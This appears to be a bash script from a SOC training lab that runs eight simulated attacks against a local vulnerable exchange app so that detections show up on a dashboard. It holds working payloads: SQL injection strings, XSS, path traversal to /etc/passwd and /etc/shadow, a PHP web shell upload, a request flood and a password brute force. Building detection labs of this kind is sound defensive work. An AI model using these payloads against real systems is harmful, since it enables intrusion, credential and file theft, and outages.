#!/bin/bash

# SOC Training - Attack Simulation Script
# Automatically detects target and runs comprehensive attack scenarios

# Detect target URL
if [ -z "$TARGET_URL" ]; then
    # Try to detect if running on same host
    if docker ps | grep -q crypto-exchange; then
        TARGET_URL="http://localhost:8080"
    else
        # Use server IP
        SERVER_IP=$(hostname -I | awk '{print $1}')
        TARGET_URL="http://$SERVER_IP:8080"
    fi
fi

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          SOC Training - Attack Simulation Suite              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Target: $TARGET_URL"
echo "Attacker IP: $(curl -s ifconfig.me 2>/dev/null || echo 'localhost')"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
}

success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

info() {
    echo -e "${YELLOW}[i]${NC} $1"
}

wait_for() {
    info "Waiting $1 seconds..."
    sleep $1
}

# Attack 1: Reconnaissance
attack "1. Reconnaissance Scan"
curl -s "$TARGET_URL/admin" -o /dev/null
curl -s "$TARGET_URL/.git/config" -o /dev/null
curl -s "$TARGET_URL/.env" -o /dev/null
curl -s "$TARGET_URL/backup" -o /dev/null
curl -s "$TARGET_URL/phpinfo.php" -o /dev/null
success "Reconnaissance complete - 5 suspicious paths probed"
wait_for 2

# Attack 2: SQL Injection
attack "2. SQL Injection Attacks"
curl -s -X POST "$TARGET_URL/login" -d "username=admin'--&password=test" -o /dev/null
curl -s -X POST "$TARGET_URL/login" -d "username=' OR 1=1--&password=test" -o /dev/null
curl -s -X POST "$TARGET_URL/login" -d "username=admin' UNION SELECT * FROM users--&password=x" -o /dev/null
success "SQL injection attempts complete - 3 payloads tested"
wait_for 2

# Attack 3: XSS
attack "3. Cross-Site Scripting (XSS)"
curl -s "$TARGET_URL/settings?name=<script>alert('XSS')</script>" -o /dev/null
curl -s "$TARGET_URL/settings?name=<img src=x onerror=alert('XSS')>" -o /dev/null
curl -s "$TARGET_URL/settings?name=javascript:alert('XSS')" -o /dev/null
success "XSS attempts complete - 3 payloads tested"
wait_for 2

# Attack 4: Path Traversal
attack "4. Path Traversal Attacks"
curl -s "$TARGET_URL/download?file=../../../../etc/passwd" -o /dev/null
curl -s "$TARGET_URL/download?file=/etc/shadow" -o /dev/null
curl -s "$TARGET_URL/download?file=../../.env" -o /dev/null
success "Path traversal attempts complete - 3 attempts logged"
wait_for 2

# Attack 5: IDOR
attack "5. IDOR Enumeration"
for i in {1..10}; do
    curl -s "$TARGET_URL/api/user/$i" -o /dev/null
done
for i in {1000..1005}; do
    curl -s "$TARGET_URL/api/user/$i" -o /dev/null
done
success "IDOR enumeration complete - 16 user IDs accessed"
wait_for 2

# Attack 6: Malicious File Upload
attack "6. Malicious File Upload"
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
echo '#!/bin/bash' > /tmp/backdoor.sh
curl -s -X POST "$TARGET_URL/upload" -F "avatar=@/tmp/shell.php" -o /dev/null
curl -s -X POST "$TARGET_URL/upload" -F "avatar=@/tmp/backdoor.sh" -o /dev/null
rm -f /tmp/shell.php /tmp/backdoor.sh
success "Malicious file uploads complete - 2 dangerous files"
wait_for 2

# Attack 7: DoS Simulation
attack "7. Denial of Service (DoS)"
info "Sending 150 rapid requests..."
for i in {1..150}; do
    curl -s "$TARGET_URL/" -o /dev/null &
done
wait
success "DoS simulation complete - High volume detected"
wait_for 2

# Attack 8: Brute Force
attack "8. Brute Force Login Attempts"
for user in admin root test; do
    for pass in password 123456 admin; do
        curl -s -X POST "$TARGET_URL/login" -d "username=$user&password=$pass" -o /dev/null
    done
done
success "Brute force complete - 9 login attempts"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              ✅ Attack Simulation Complete!                   ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
success "All 8 attack scenarios executed successfully"
echo ""
info "Expected Detections in SOC Dashboard:"
echo "  • RECONNAISSANCE_SCAN"
echo "  • SQL_INJECTION"
echo "  • XSS_ATTEMPT"
echo "  • PATH_TRAVERSAL"
echo "  • IDOR_ENUMERATION"
echo "  • MALICIOUS_FILE_UPLOAD"
echo "  • DOS_ATTACK"
echo "  • Multiple login attempts"
echo ""
info "Next Steps:"
echo "  1. Login to SOC Dashboard at http://$(hostname -I | awk '{print $1}'):3000"
echo "  2. View attack map and statistics"
echo "  3. Create incidents for high-priority attacks"
echo "  4. Practice SOC workflow (Tier 1 → Tier 2 → IR)"
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         Check your SOC Dashboard for live alerts! 🛡️         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
